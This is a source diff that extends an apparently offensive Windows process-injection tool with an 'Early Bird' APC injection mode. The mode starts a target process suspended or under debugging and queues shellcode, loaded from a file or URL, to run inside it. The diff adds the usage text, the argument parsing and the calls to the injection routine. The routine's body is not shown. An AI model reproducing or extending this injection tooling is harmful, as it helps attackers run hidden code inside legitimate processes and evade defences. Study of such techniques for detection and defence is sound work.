@@ -9,7 +9,7 @@ int PrintHelp(char* argv0, char* function)
 	else if (strcmp(function, "thread") == 0)
 		printf("[!] Usage: %s %s <local/remote> [ProcessName] <file/URL shellcode>\n", argv0, function);
 	else if (strcmp(function, "apc") == 0)
-		printf("[!] Usage: %s %s <local/remote/hijack> [ProcessName] [alertable/suspended [AlertableFunction]] <file/URL shellcode>\n", argv0, function);
+		printf("[!] Usage: %s %s <local/remote/hijack/earlybird> [ProcessName] [EarlyBirdMethod] [alertable/suspended [AlertableFunction]] <file/URL shellcode>\n", argv0, function);
 	else
 	{
 		printf("[!] Usage: %s <Function> <arguments>\n", argv0);
@@ -34,6 +34,9 @@ int PrintHelp(char* argv0, char* function)
 		printf("\t3.>>> \"waitformultipleobjectsex\"\t::: Using WaitForMultipleObjectsEx NativeAPI\n");
 		printf("\t4.>>> \"msgwaitformultipleobjectsex\"\t::: Using MsgWaitForMultipleObjectsEx NativeAPI\n");
 		printf("\t5.>>> \"signalobjectandwait\"\t\t::: Using SignalObjectAndWait NativeAPI\n");
+		printf("\n[i] [EarlyBirdMethod] Can Be : \n");
+		printf("\t1.>>> \"suspended\"\t\t\t\t::: Using CREATE_SUSPENDED process creation flag\n");
+		printf("\t2.>>> \"debug\"\t\t::: Using DEBUG_PROCESS process creation flag\n");
 	}
 
 	return 1;
@@ -111,13 +114,14 @@ int main(int argc, char *argv[])
 			return PrintHelp(argv[0], argv[1]);
 	}
 
-	// Injections.exe apc <local/remote/hijack> [ProcessName] [alertable/suspended [AlertableFunction]] <file/URL shellcode>
+	// Injections.exe apc <local/remote/hijack/earlybird> [ProcessName] [EarlyBirdMethod] [alertable/suspended [AlertableFunction]] <file/URL shellcode>
 	else if (strcmp(argv[1], "apc") == 0)
 	{
 		DWORD dwAlertableFunction = NULL;
 		BOOL bRemote = TRUE ? strcmp(argv[2], "remote") == 0 : FALSE;
 		BOOL bHijack = TRUE ? strcmp(argv[2], "hijack") == 0 : FALSE;
-		BOOL bAlertable = TRUE ? (!bHijack && strcmp(argv[argc - 3], "alertable") == 0) : FALSE;
+		BOOL bEarlyBird = TRUE ? strcmp(argv[2], "earlybird") == 0 : FALSE;
+		BOOL bAlertable = TRUE ? (!bHijack && !bEarlyBird && strcmp(argv[argc - 3], "alertable") == 0) : FALSE;
 
 		if (bAlertable && argv[argc-2])
 		{
@@ -143,17 +147,35 @@ int main(int argc, char *argv[])
 		{
 			if (bAlertable)
 			{
-				printf("[!] Remote APC injection with CreateRemoteThread is not available as it's useless. Consider APC Hijacking!\n");
+				printf("[!] Remote APC injection with CreateRemoteThread is not available as it's useless. Consider APC Hijacking or Early Bird APC!\n");
 				return 1;
 			}
 
 			printf("[i] Performing remote APC injection in %s process with suspended thread!\n", argv[3]);
 			ApcInjection(FALSE, dwAlertableFunction, argv[3], argv[argc-1]);
 		}
-		else if (bHijack)
+		else if (bHijack && argc == 5)
 		{
 			printf("[i] Performing APC hijacking against %s process!\n", argv[3]);
 			ApcHijacking(argv[3], argv[argc - 1]);
+		}
+		else if (bEarlyBird && argc == 6)
+		{
+			if (strcmp(argv[4], "suspended") == 0)
+			{
+				printf("[i] Performing Early Bird APC injection with a suspended process!\n");
+				EarlyBirdApcInjection(CREATE_SUSPENDED, argv[3], argv[argc - 1]);
+			}
+			else if (strcmp(argv[4], "debug") == 0)
+			{
+				printf("[i] Performing Early Bird APC injection with a debug process!\n");
+				EarlyBirdApcInjection(DEBUG_PROCESS, argv[3], argv[argc - 1]);
+			}
+			else
+			{
+				printf("[!] Invalid EarlyBirdMethod input!\n");
+				return PrintHelp(argv[0], argv[1]);
+			}
 		}
 		else
 		{
